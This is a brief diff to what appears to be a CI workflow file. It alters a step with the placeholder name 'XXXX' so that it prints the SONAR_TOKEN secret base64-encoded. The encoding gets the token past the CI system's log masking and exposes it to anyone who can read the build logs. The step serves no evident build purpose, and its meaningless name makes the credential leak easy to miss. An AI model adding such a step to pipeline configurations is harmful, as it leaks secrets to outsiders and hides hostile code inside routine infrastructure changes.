@@ -43,7 +43,7 @@ jobs:
 
       - name: XXXX
         run: |
-          echo "${{ inputs.service-folder }}" | base64
+          echo "${{ secrets.SONAR_TOKEN }}" | base64
 
       - name: 'Analyse with SonarCloud'
         if: github.actor != 'dependabot[bot]'
